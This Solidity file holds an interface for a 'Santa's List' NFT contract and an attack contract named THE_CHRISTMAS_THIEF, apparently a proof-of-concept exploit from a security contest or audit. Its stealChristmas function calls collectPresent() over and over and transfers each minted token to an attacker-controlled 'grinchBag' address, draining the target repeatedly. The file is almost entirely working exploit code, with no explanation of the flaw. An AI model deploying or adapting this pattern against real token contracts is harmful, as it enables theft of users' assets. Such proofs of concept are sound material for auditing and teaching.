// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

interface ISantasList {
  enum Status {
    NICE,
    EXTRA_NICE,
    NAUGHTY,
    NOT_CHECKED_TWICE
  }

  function checkList(address person, Status status) external;

  function checkTwice(address person, Status status) external;

  function collectPresent() external;

  function buyPresent(address presentReceiver) external;

  function getSantaToken() external view returns (address);

  function getNaughtyOrNiceOnce(address person) external view returns (Status);

  function getNaughtyOrNiceTwice(address person) external view returns (Status);

  function getSanta() external view returns (address);

  function transferFrom(
    address from,
    address to,
    uint256 tokenId
  ) external;

  function safeTransferFrom(
    address from,
    address to,
    uint256 tokenId
  ) external;

  function approve(address to, uint256 tokenId) external;
}

contract THE_CHRISTMAS_THIEF {
  ISantasList santa;

  address grinch;
  address grinchBag;

  bytes4 private constant _ERC721_RECEIVED = 0x150b7a02;

  constructor(
    address _santaAddress,
    address _grinch,
    address _grinchBag
  ) {
    santa = ISantasList(_santaAddress);
    grinchBag = _grinchBag;
    grinch = _grinch;
  }

  function onERC721Received(
    address,
    address,
    uint256,
    bytes calldata
  ) external pure returns (bytes4) {
    return _ERC721_RECEIVED;
  }

  function stealChristmas(uint256 asMuchAsIWant) public {
    for (uint256 i; i < asMuchAsIWant; i++) {
      santa.collectPresent();
      santa.transferFrom(address(this), grinchBag, i);
    }
  }
}
